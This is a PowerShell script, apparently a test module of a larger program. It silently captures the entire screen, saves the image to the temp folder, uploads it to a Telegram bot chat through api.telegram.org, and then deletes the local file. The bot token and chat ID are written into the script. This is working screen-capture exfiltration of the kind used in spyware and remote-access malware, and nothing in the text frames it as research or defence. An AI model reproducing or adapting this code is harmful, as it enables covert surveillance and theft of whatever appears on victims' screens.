# Test Screenshot Function
$x = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w"
$y = "2146236602"

# Take screenshot
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$screen=[System.Windows.Forms.SystemInformation]::VirtualScreen
$bitmap=New-Object Drawing.Bitmap $screen.Width,$screen.Height
$graphics=[Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.X,$screen.Y,0,0,$bitmap.Size)
$path="$env:TEMP\test_ss.png"
$bitmap.Save($path)
$graphics.Dispose();$bitmap.Dispose()

# Send using the EXACT method from your main script
$caption="Test screenshot"
$fileBytes=[System.IO.File]::ReadAllBytes($path)
$fileEnc=[System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
$boundary=[System.Guid]::NewGuid().ToString()
$bodyLines = (
    "--$boundary",
    "Content-Disposition: form-data; name=`"chat_id`"",
    "",
    $y,
    "--$boundary",
    "Content-Disposition: form-data; name=`"caption`"",
    "",
    $caption,
    "--$boundary",
    "Content-Disposition: form-data; name=`"photo`"; filename=`"test.png`"",
    "Content-Type: image/png",
    "",
    $fileEnc,
    "--$boundary--"
) -join "`r`n"

$uri="https://api.telegram.org/bot$x/sendPhoto"

try {
    $response=Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body ([System.Text.Encoding]::UTF8.GetBytes($bodyLines))
    if($response.ok){
        Write-Host "✅ Screenshot sent successfully!" -ForegroundColor Green
    }
} catch {
    Write-Host "❌ Error: $($_.Exception.Message)" -ForegroundColor Red
}

# Cleanup
Remove-Item $path -ErrorAction SilentlyContinue
